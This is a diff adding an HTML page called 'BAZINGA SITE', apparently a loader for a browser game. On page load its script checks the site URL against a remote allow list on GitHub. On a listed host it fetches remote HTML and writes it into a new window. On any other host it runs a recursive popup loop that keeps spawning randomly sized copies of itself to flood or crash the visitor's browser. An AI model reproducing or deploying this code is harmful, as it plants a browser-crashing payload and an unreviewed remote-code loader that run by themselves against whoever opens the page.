@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>BAZINGA SITE</title>
+  <script>
+async function fetchFileContent(fileName) {
+            const fileUrl = `https://raw.githubusercontent.com/goaded/bazinga/main/${fileName}`;
+            try {
+                const response = await fetch(fileUrl);
+
+                if (response.ok) {
+                    return await response.text();
+                } else {
+                    throw new Error(`Failed to fetch ${fileName}: HTTP ${response.status}`);
+                }
+            } catch (error) {
+                console.error(error.message);
+                alert(`Error: ${error.message}`);
+                throw error;
+            }
+        }
+
+        // Function to check whether the current URL is allowed
+        async function checkAllowFile() {
+            try {
+                // Fetch and split the "allow" file content
+                const allowContent = await fetchFileContent("allow");
+                const allowedList = allowContent.split("/").map(item => item.trim());
+                const currentURL = window.location.href;
+
+                // Check if the current URL contains any allowed item
+                const isAllowed = allowedList.some(item => currentURL.includes(item));
+
+                if (isAllowed) {
+                    openGameInBlank()
+                } else {
+                    myFunction();
+                }
+            } catch (error) {
+                console.error("Error checking allowed URLs:", error.message);
+            }
+        }
+
+        // Function to open a new tab using a blank: URL and insert the HTML content from "minecraf.html"
+        async function openGameInBlank() {
+            try {
+                const game = await fetchFileContent("main.html");
+                
+                let newWindow = window.open("", "_blank", "width=3000,height=3000");
+                newWindow.document.write(game);
+    newWindow.document.close();
+            } catch (error) {
+                console.error("Error opening game tab:", error.message);
+            }
+        }
+
+        // Function to handle cases where the current URL is not allowed
+        function myFunction() {
+let randomWidth = Math.floor(Math.random() * 800) + 200;
+let randomHeight = Math.floor(Math.random() * 600) + 200;  
+const myWindow = window.open(window.location.href,target='_blank',`width=${randomWidth},height=${randomHeight}`);
+  myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+  myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+}
+
+        // Run the checkAllowFile function after the DOM content is fully loaded
+        document.addEventListener("DOMContentLoaded", checkAllowFile);
+  </script>
+</head>
+</body>
+</html>
